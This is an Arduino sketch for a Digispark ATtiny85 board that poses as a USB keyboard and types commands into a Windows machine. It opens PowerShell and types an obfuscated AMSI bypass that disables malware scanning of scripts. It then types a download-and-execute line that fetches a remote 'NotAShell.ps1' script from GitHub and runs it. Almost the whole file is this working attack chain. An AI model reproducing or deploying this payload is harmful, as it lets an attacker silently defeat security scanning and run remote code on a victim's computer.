#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  // Launch Powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  //amsi bypass
  DigiKeyboard.println("[Ref].Assembly.GetType('System.Management.Automation.'+$([cHAr]([ByTE]0x41)+[cHAr]([byte]0x6D)+[ChAR](115)+[char]([bYtE]0x69))+'Utils').GetField($([systeM.NET.WEbUtIliTY]::HtMldECoDe('&#97;&#109;&#115;&#105;&#73;&#110;&#105;&#116;&#70;&#97;&#105;&#108;&#101;&#100;')),'NonPublic,Static').SetValue($null,$true);");
  DigiKeyboard.delay(3000);
  // Shell
  DigiKeyboard.println(F("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/secjames/Attiny85/main/payloads/NotAShell.ps1'); NotAShell"));
  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
  
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }

}
